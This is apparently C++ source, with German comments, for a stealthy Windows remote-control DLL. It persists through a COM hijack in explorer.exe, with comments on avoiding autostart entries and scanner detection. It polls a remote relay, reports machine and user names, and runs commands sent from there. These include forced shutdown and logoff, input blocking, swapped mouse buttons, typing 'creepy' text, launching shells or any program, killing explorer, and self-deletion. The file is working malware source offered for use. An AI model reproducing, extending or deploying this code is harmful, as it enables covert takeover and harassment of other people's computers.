// AudioAgent.cpp - native x64 in-proc agent.
//
// Wird von explorer.exe geladen (COM-Hijack in HKCU\Software\Classes\CLSID)
// und haengt danach im Explorer-Prozess. Kein eigener Prozess, kein Run-Key,
// kein Eintrag unter "Autostart-Apps". Explorer startet bei jeder Anmeldung,
// also startet der Agent mit - ohne Admin, ohne Dienst, ohne Aufgabe.
//
// Build:  siehe build.bat  (cl /LD /std:c++17 /W4 /O2 /DUNICODE /D_UNICODE)
//
// Kein Injectionscode in dieser Datei. Das ist Absicht: LoadLibraryW +
// CreateRemoteThread im Image ist genau das, was Scanner benannt haben.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <powrprof.h>
#include <reason.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "powrprof.lib")

namespace {

// ---- Konfiguration -------------------------------------------------------

// Reihenfolge: Umgebungsvariable, Datei neben der DLL, dann dieser Wert.
const wchar_t* kDefaultRelay = L"https://panic-relay.onrender.com";

std::wstring g_relay;
std::string g_machine;
std::string g_user;
volatile bool g_running = true;

std::wstring NarrowToWide(const std::string& s)
{
    if (s.empty()) return std::wstring();
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring w((size_t)n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}

std::string WideToNarrow(const std::wstring& w)
{
    if (w.empty()) return std::string();
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s((size_t)n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, nullptr, nullptr);
    return s;
}

std::string MachineName()
{
    wchar_t buf[256]{};
    DWORD len = 255;
    if (!GetComputerNameW(buf, &len)) return "unbekannt";
    return WideToNarrow(buf);
}

std::string UserName()
{
    wchar_t buf[256]{};
    DWORD len = 255;
    if (!GetUserNameW(buf, &len)) return "unbekannt";
    return WideToNarrow(buf);
}

std::wstring ResolveRelay()
{
    wchar_t env[1024]{};
    DWORD n = GetEnvironmentVariableW(L"PANIC_RELAY_URL", env, 1023);
    if (n > 0 && n < 1023) return std::wstring(env);

    // relay.txt neben der DLL (der Installer schreibt sie)
    wchar_t self[MAX_PATH]{};
    HMODULE hm = nullptr;
    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                           GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                           (LPCWSTR)&ResolveRelay, &hm))
    {
        GetModuleFileNameW(hm, self, MAX_PATH);
    }
    if (self[0])
    {
        std::wstring dir(self);
        size_t pos = dir.find_last_of(L"\\/");
        if (pos != std::wstring::npos) dir = dir.substr(0, pos);
        for (const wchar_t* name : { L"relay.txt", L"relay.url" })
        {
            std::wstring path = dir + L"\\" + name;
            HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (h == INVALID_HANDLE_VALUE) continue;
            char buf[1024]{};
            DWORD read = 0;
            ReadFile(h, buf, sizeof(buf) - 1, &read, nullptr);
            CloseHandle(h);
            std::wstring value = NarrowToWide(std::string(buf, read));
            while (!value.empty() && (value.back() == L'\r' || value.back() == L'\n' || value.back() == L' '))
                value.pop_back();
            if (!value.empty()) return value;
        }
    }
    return kDefaultRelay;
}

// ---- HTTP ----------------------------------------------------------------


bool HttpPost(const std::wstring& url, const std::string& body, std::string& out, DWORD timeoutMs)
{
    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256]{};
    wchar_t path[2048]{};
    uc.lpszHostName = host; uc.dwHostNameLength = 255;
    uc.lpszUrlPath = path;  uc.dwUrlPathLength = 2047;

    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &uc)) return false;
    if (uc.dwHostNameLength == 0) return false;

    HINTERNET session = WinHttpOpen(L"AudioHost/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;

    WinHttpSetTimeouts(session, (int)timeoutMs, (int)timeoutMs, (int)timeoutMs, (int)timeoutMs);

    bool ok = false;
    HINTERNET conn = WinHttpConnect(session, host, uc.nPort, 0);
    if (conn)
    {
        DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET req = WinHttpOpenRequest(conn, L"POST", path, nullptr,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (req)
        {
            const wchar_t* headers = L"Content-Type: application/json\r\n";
            BOOL sent = WinHttpSendRequest(req, headers, (DWORD)-1L,
                                           (LPVOID)body.data(), (DWORD)body.size(),
                                           (DWORD)body.size(), 0);
            if (sent && WinHttpReceiveResponse(req, nullptr))
            {
                DWORD status = 0, sz = sizeof(status);
                WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                    WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
                if (status >= 200 && status < 300)
                {
                    std::string acc;
                    for (;;)
                    {
                        DWORD avail = 0;
                        if (!WinHttpQueryDataAvailable(req, &avail) || avail == 0) break;
                        std::string chunk(avail, '\0');
                        DWORD read = 0;
                        if (!WinHttpReadData(req, &chunk[0], avail, &read) || read == 0) break;
                        acc.append(chunk.data(), read);
                        if (acc.size() > (16u << 20)) break;
                    }
                    out.swap(acc);
                    ok = true;
                }
            }
            WinHttpCloseHandle(req);
        }
        WinHttpCloseHandle(conn);
    }
    WinHttpCloseHandle(session);
    return ok;
}

void Report(const std::string& step, const std::string& msg)
{
    std::string body = "{\"machine\":\"" + g_machine + "\",\"step\":\"" + step +
                       "\",\"msg\":\"" + msg + "\"}";
    std::string ignored;
    HttpPost(g_relay + L"/api/report", body, ignored, 4000);
}

// ---- minimales JSON ------------------------------------------------------

std::string JsonString(const std::string& obj, const char* key)
{
    std::string needle = std::string("\"") + key + "\"";
    size_t p = obj.find(needle);
    if (p == std::string::npos) return std::string();
    p = obj.find(':', p + needle.size());
    if (p == std::string::npos) return std::string();
    p = obj.find('"', p + 1);
    if (p == std::string::npos) return std::string();
    std::string out;
    for (size_t i = p + 1; i < obj.size(); ++i)
    {
        char c = obj[i];
        if (c == '\\' && i + 1 < obj.size())
        {
            char e = obj[++i];
            switch (e)
            {
            case 'n': out.push_back('\n'); break;
            case 't': out.push_back('\t'); break;
            case 'r': out.push_back('\r'); break;
            case 'u':
            {
                if (i + 4 < obj.size())
                {
                    unsigned code = (unsigned)strtoul(obj.substr(i + 1, 4).c_str(), nullptr, 16);
                    i += 4;
                    if (code < 0x80) out.push_back((char)code);
                    else
                    {
                        wchar_t w = (wchar_t)code;
                        out += WideToNarrow(std::wstring(1, w));
                    }
                }
                break;
            }
            default: out.push_back(e); break;
            }
            continue;
        }
        if (c == '"') break;
        out.push_back(c);
    }
    return out;
}

int JsonInt(const std::string& obj, const char* key, int fallback)
{
    std::string needle = std::string("\"") + key + "\"";
    size_t p = obj.find(needle);
    if (p == std::string::npos) return fallback;
    p = obj.find(':', p + needle.size());
    if (p == std::string::npos) return fallback;
    while (p + 1 < obj.size() && (obj[p + 1] == ' ' || obj[p + 1] == '\t')) ++p;
    return atoi(obj.c_str() + p + 1);
}

std::vector<std::string> SplitObjects(const std::string& array)
{
    std::vector<std::string> out;
    int depth = 0;
    size_t start = std::string::npos;
    for (size_t i = 0; i < array.size(); ++i)
    {
        char c = array[i];
        if (c == '"')
        {
            for (++i; i < array.size(); ++i)
            {
                if (array[i] == '\\') { ++i; continue; }
                if (array[i] == '"') break;
            }
            continue;
        }
        if (c == '{')
        {
            if (depth == 0) start = i;
            ++depth;
        }
        else if (c == '}')
        {
            if (depth > 0) --depth;
            if (depth == 0 && start != std::string::npos)
            {
                out.push_back(array.substr(start, i - start + 1));
                start = std::string::npos;
            }
        }
    }
    return out;
}

// ---- Win32-Aktionen ------------------------------------------------------

bool EnableShutdownPrivilege()
{
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid))
    {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr) != FALSE;
    }
    CloseHandle(token);
    return ok;
}

void SendKey(WORD vk, bool down)
{
    INPUT in{};
    in.type = INPUT_KEYBOARD;
    in.ki.wVk = vk;
    in.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
    SendInput(1, &in, sizeof(in));
}

void TapKey(WORD vk)
{
    SendKey(vk, true);
    Sleep(30);
    SendKey(vk, false);
}

void TapCombo(WORD modifier, WORD vk)
{
    SendKey(modifier, true);
    Sleep(25);
    TapKey(vk);
    Sleep(25);
    SendKey(modifier, false);
}

void MouseButton(DWORD flag, int clicks)
{
    for (int i = 0; i < clicks; ++i)
    {
        INPUT in{};
        in.type = INPUT_MOUSE;
        in.mi.dwFlags = flag;
        SendInput(1, &in, sizeof(in));
        Sleep(40);
    }
}

void MouseWheel(int notches)
{
    INPUT in{};
    in.type = INPUT_MOUSE;
    in.mi.dwFlags = MOUSEEVENTF_WHEEL;
    in.mi.mouseData = (DWORD)(notches * WHEEL_DELTA);
    SendInput(1, &in, sizeof(in));
}

// Text als Unicode-Keyevents. Layout-unabhaengig: es wird das Zeichen gesendet,
// nicht die Taste. Damit ist es egal, ob die Zielmaschine DE oder US ist.
void TypeText(const std::string& utf8, int gapMs)
{
    std::wstring wide = NarrowToWide(utf8);
    for (wchar_t ch : wide)
    {
        INPUT in[2]{};
        in[0].type = INPUT_KEYBOARD;
        in[0].ki.wScan = ch;
        in[0].ki.dwFlags = KEYEVENTF_UNICODE;
        in[1] = in[0];
        in[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(2, in, sizeof(INPUT));
        Sleep(gapMs > 0 ? (DWORD)gapMs : 5);
    }
}

DWORD g_savedMouseSpeed = 0;
bool g_speedSaved = false;
bool g_swapped = false;

// ---- Tabellen fuer die einfachen Aktionen --------------------------------

struct Combo { const char* action; WORD mod; WORD vk; };

// mod: 1=Ctrl 2=Shift 4=Alt 8=Win
const Combo kCombos[] = {
    { "undo",            1, 'Z' },
    { "save",            1, 'S' },
    { "selectAllSpace",  1, 'A' },
    { "browserZoomIn",   1, VK_OEM_PLUS },
    { "browserZoomReset",1, '0' },
    { "browserNewTab",   1, 'T' },
    { "browserHardRefresh", 1, VK_F5 },
    { "browserRefresh",  0, VK_F5 },
    { "browserBack",     4, VK_LEFT },
    { "browserFullscreen", 0, VK_F11 },
    { "closeTab",        1, 'W' },
    { "reopenTab",       3, 'T' },
    { "history",         1, 'H' },
    { "downloads",       1, 'J' },
    { "tabNext",         1, VK_TAB },
    { "tabPrev",         3, VK_TAB },
    { "taskMgr",         3, VK_ESCAPE },
    { "taskView",        8, VK_TAB },
    { "taskViewToggle",  8, VK_TAB },
    { "peekDesktop",     8, VK_OEM_COMMA },
    { "minimizeAll",     8, 'D' },
    { "desktop",         8, 'D' },
    { "emojiPanel",      8, VK_OEM_PERIOD },
    { "magnifier",       8, VK_OEM_PLUS },
    { "zoomOut",         8, VK_OEM_MINUS },
    { "printDialog",     1, 'P' },
    { "printScreen",     0, VK_SNAPSHOT },
    { "clipboardClear",  1, VK_DELETE },
    { "magnifierInvert", 8, 'I' },
    { "gameBar",         8, 'G' },
    { "xboxRecord",      10, 'R' },
};

struct Launch { const char* action; const wchar_t* target; };

const Launch kLaunches[] = {
    { "openCmd",          L"cmd.exe" },
    { "openPowerShell",   L"powershell.exe" },
    { "openNotepad",      L"notepad.exe" },
    { "openCalculator",   L"calc.exe" },
    { "openExplorer",     L"explorer.exe" },
    { "openControlPanel", L"control.exe" },
    { "openSettings",     L"ms-settings:" },
    { "openRegedit",      L"regedit.exe" },
    { "openDeviceManager",L"devmgmt.msc" },
    { "openEventViewer",  L"eventvwr.msc" },
    { "osk",              L"osk.exe" },
    { "narrator",         L"narrator.exe" },
    { "snippingTool",     L"ms-screenclip:" },
    { "openDownloadsFolder", L"shell:Downloads" },
    { "openTempFolder",   L"%TEMP%" },
};

void SendCombo(WORD mod, WORD vk)
{
    const WORD mods[] = { VK_CONTROL, VK_SHIFT, VK_LMENU, VK_LWIN };
    for (int i = 0; i < 4; ++i)
        if (mod & (1 << i)) SendKey(mods[i], true);
    Sleep(20);
    SendKey(vk, true);
    Sleep(25);
    SendKey(vk, false);
    Sleep(20);
    for (int i = 3; i >= 0; --i)
        if (mod & (1 << i)) SendKey(mods[i], false);
}

void ShellOpen(const std::wstring& target)
{
    STARTUPINFOW si{ sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    PROCESS_INFORMATION pi{};
    std::wstring cmd = L"cmd.exe /c start \"\" \"" + target + L"\"";
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                       nullptr, nullptr, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    ShellExecuteW(nullptr, L"open", target.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}

void SetClipboardText(const std::string& utf8)
{
    std::wstring wide = NarrowToWide(utf8);
    if (!OpenClipboard(nullptr)) return;
    EmptyClipboard();
    size_t bytes = (wide.size() + 1) * sizeof(wchar_t);
    HGLOBAL mem = GlobalAlloc(GMEM_MOVEABLE, bytes);
    if (mem)
    {
        void* dst = GlobalLock(mem);
        if (dst)
        {
            memcpy(dst, wide.c_str(), bytes);
            GlobalUnlock(mem);
            SetClipboardData(CF_UNICODETEXT, mem);
        }
    }
    CloseClipboard();
}

bool SimpleAction(const std::string& action, const std::string& text, int seconds)
{
    for (const Combo& c : kCombos)
        if (action == c.action) { SendCombo(c.mod, c.vk); return true; }

    for (const Launch& l : kLaunches)
        if (action == l.action) { ShellOpen(l.target); return true; }

    if (action == "launchApp" && !text.empty()) { ShellOpen(NarrowToWide(text)); return true; }
    if (action == "clipboardWrite") { SetClipboardText(text); return true; }
    if (action == "pasteClipboard") { SendCombo(1, 'V'); return true; }

    if (action == "mediaPlayPause") { TapKey(VK_MEDIA_PLAY_PAUSE); return true; }
    if (action == "mediaNext")      { TapKey(VK_MEDIA_NEXT_TRACK); return true; }
    if (action == "mediaPrev")      { TapKey(VK_MEDIA_PREV_TRACK); return true; }
    if (action == "mediaStop")      { TapKey(VK_MEDIA_STOP); return true; }
    if (action == "mediaMute")      { TapKey(VK_VOLUME_MUTE); return true; }
    if (action == "volUp")          { for (int i = 0; i < 4; ++i) TapKey(VK_VOLUME_UP); return true; }
    if (action == "volDown")        { for (int i = 0; i < 4; ++i) TapKey(VK_VOLUME_DOWN); return true; }
    if (action == "volumeMax")      { for (int i = 0; i < 30; ++i) TapKey(VK_VOLUME_UP); return true; }

    if (action == "monitorOff")
    {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
        return true;
    }
    if (action == "monitorOn")
    {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
        return true;
    }
    if (action == "screenBlank") { SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2); return true; }

    if (action == "keepAwake")
    {
        SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
        return true;
    }
    if (action == "keepAwakeOff") { SetThreadExecutionState(ES_CONTINUOUS); return true; }

    if (action == "restartExplorer")
    {
        std::wstring cmd = L"cmd.exe /c taskkill /f /im explorer.exe & start explorer.exe";
        STARTUPINFOW si{ sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return true;
    }
    if (action == "killExplorer")
    {
        std::wstring cmd = L"cmd.exe /c taskkill /f /im explorer.exe";
        STARTUPINFOW si{ sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return true;
    }

    if (action == "hideCursor")
    {
        while (ShowCursor(FALSE) >= 0) {}
        return true;
    }
    if (action == "showCursor")
    {
        while (ShowCursor(TRUE) < 0) {}
        return true;
    }

    if (action == "typeSpam" || action == "doubleSpace" || action == "selectAllSpace")
    {
        std::string body = text.empty() ? std::string(" ") : text;
        for (int i = 0; i < 200 && g_running; ++i) TypeText(body, 1);
        return true;
    }
    if (action == "tapKey" && !text.empty()) { TapKey((WORD)atoi(text.c_str())); return true; }

    return false;
}

void StopAll()
{
    if (g_speedSaved) { SystemParametersInfoW(SPI_SETMOUSESPEED, 0, (PVOID)(INT_PTR)g_savedMouseSpeed, 0); g_speedSaved = false; }
    if (g_swapped) { SwapMouseButton(FALSE); g_swapped = false; }
    BlockInput(FALSE);
}

void Execute(const std::string& action, const std::string& text, int seconds)
{
    if (action == "ping") { Report("ping", "ok"); return; }
    if (action == "lock") { LockWorkStation(); return; }
    if (action == "desktop") { TapCombo(VK_LWIN, (WORD)'D'); return; }
    if (action == "sleep") { SetSuspendState(FALSE, TRUE, FALSE); return; }
    if (action == "shutdown")
    {
        EnableShutdownPrivilege();
        ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER);
        return;
    }
    if (action == "restart")
    {
        EnableShutdownPrivilege();
        ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER);
        return;
    }
    if (action == "logoff")
    {
        EnableShutdownPrivilege();
        ExitWindowsEx(EWX_LOGOFF | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER);
        return;
    }
    if (action == "mouseLeft")   { MouseButton(MOUSEEVENTF_LEFTDOWN, 1);  MouseButton(MOUSEEVENTF_LEFTUP, 1);  return; }
    if (action == "mouseRight")  { MouseButton(MOUSEEVENTF_RIGHTDOWN, 1); MouseButton(MOUSEEVENTF_RIGHTUP, 1); return; }
    if (action == "mouseMiddle") { MouseButton(MOUSEEVENTF_MIDDLEDOWN, 1); MouseButton(MOUSEEVENTF_MIDDLEUP, 1); return; }
    if (action == "mouseDouble")
    {
        for (int i = 0; i < 2; ++i)
        {
            MouseButton(MOUSEEVENTF_LEFTDOWN, 1);
            MouseButton(MOUSEEVENTF_LEFTUP, 1);
            Sleep(60);
        }
        return;
    }
    if (action == "scrollUp")   { MouseWheel(3); return; }
    if (action == "scrollDown") { MouseWheel(-3); return; }
    if (action == "stopAll")    { StopAll(); return; }
    if (action == "blockInput")
    {
        BlockInput(TRUE);
        if (seconds > 0) Sleep((DWORD)seconds * 1000);
        BlockInput(FALSE);
        return;
    }
    if (action == "mouseSpeedMin")
    {
        if (!g_speedSaved)
        {
            INT_PTR cur = 0;
            if (SystemParametersInfoW(SPI_GETMOUSESPEED, 0, &cur, 0)) { g_savedMouseSpeed = (DWORD)cur; g_speedSaved = true; }
        }
        SystemParametersInfoW(SPI_SETMOUSESPEED, 0, (PVOID)(INT_PTR)1, 0);
        return;
    }
    if (action == "mouseSpeedNormal")
    {
        SystemParametersInfoW(SPI_SETMOUSESPEED, 0, (PVOID)(INT_PTR)10, 0);
        g_speedSaved = false;
        return;
    }
    if (action == "swapButtons")    { SwapMouseButton(TRUE);  g_swapped = true;  return; }
    if (action == "swapButtonsOff") { SwapMouseButton(FALSE); g_swapped = false; return; }
    if (action == "typeText")       { TypeText(text, seconds > 0 ? seconds : 5); return; }
    if (action == "creepy" || action == "notice") { TypeText(text, 5); return; }
    if (action == "ctrlAltDel")     { TapCombo(VK_CONTROL, VK_LMENU); TapKey(VK_DELETE); return; }
    if (action == "altTab")         { TapCombo(VK_LMENU, VK_TAB); return; }
    if (action == "altF4")          { TapCombo(VK_LMENU, VK_F4); return; }
    if (action == "win")            { TapKey(VK_LWIN); return; }
    if (action == "esc")            { TapKey(VK_ESCAPE); return; }
    if (action == "enter")          { TapKey(VK_RETURN); return; }
    if (action == "selfDestruct")
    {
        // Eintraege wegraeumen. Die DLL selbst verschwindet beim naechsten
        // Explorer-Start, weil sie dann nicht mehr registriert ist.
        const wchar_t* keys[] = {
            L"Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}",
            L"Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32"
        };
        for (const wchar_t* k : keys)
        {
            std::wstring cmd = std::wstring(L"reg delete \"HKCU\\") + k + L"\" /f";
            STARTUPINFOW si{ sizeof(si) }; PROCESS_INFORMATION pi{};
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            std::wstring mutableCmd = cmd;
            if (CreateProcessW(nullptr, &mutableCmd[0], nullptr, nullptr, FALSE,
                               CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
            {
                WaitForSingleObject(pi.hProcess, 4000);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        }
        g_running = false;
        return;
    }
    if (SimpleAction(action, text, seconds)) return;
    Report("action", "unbekannt: " + action);
}

// ---- Schleife ------------------------------------------------------------

DWORD WINAPI AgentThread(LPVOID)
{
    g_relay = ResolveRelay();
    g_machine = MachineName();
    g_user = UserName();

    Report("boot", "dll user=" + g_user + " relay=" + WideToNarrow(g_relay));

    bool firstFail = false;
    while (g_running)
    {
        std::string body = "{\"machine\":\"" + g_machine + "\",\"user\":\"" + g_user +
                           "\",\"tunnel\":\"\",\"ts\":0}";
        std::string response;
        if (!HttpPost(g_relay + L"/api/poll", body, response, 8000))
        {
            if (!firstFail)
            {
                firstFail = true;
                Report("poll", "kein kontakt");
            }
            Sleep(3000);
            continue;
        }
        firstFail = false;

        for (const std::string& cmd : SplitObjects(response))
        {
            std::string action = JsonString(cmd, "action");
            if (action.empty())
            {
                std::string kind = JsonString(cmd, "cmd");
                if (kind == "action") action = JsonString(cmd, "action");
                else if (!kind.empty()) action = kind;
            }
            if (action.empty() || action == "heartbeat" || action == "mouse") continue;
            std::string text = JsonString(cmd, "text");
            int seconds = JsonInt(cmd, "seconds", 0);
            Execute(action, text, seconds);
        }
        Sleep(800);
    }
    return 0;
}

} // namespace

// ---- Exporte -------------------------------------------------------------

extern "C" __declspec(dllexport) void __stdcall StartAgent()
{
    static LONG started = 0;
    if (InterlockedExchange(&started, 1) != 0) return;
    CreateThread(nullptr, 0, AgentThread, nullptr, 0, nullptr);
}

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(module);

        // DLL im Prozess festhalten: ein COM-Server darf nicht entladen werden,
        // waehrend sein Thread noch laeuft.
        HMODULE pinned = nullptr;
        GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_PIN | GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                           (LPCWSTR)&StartAgent, &pinned);
        StartAgent();
    }
    return TRUE;
}
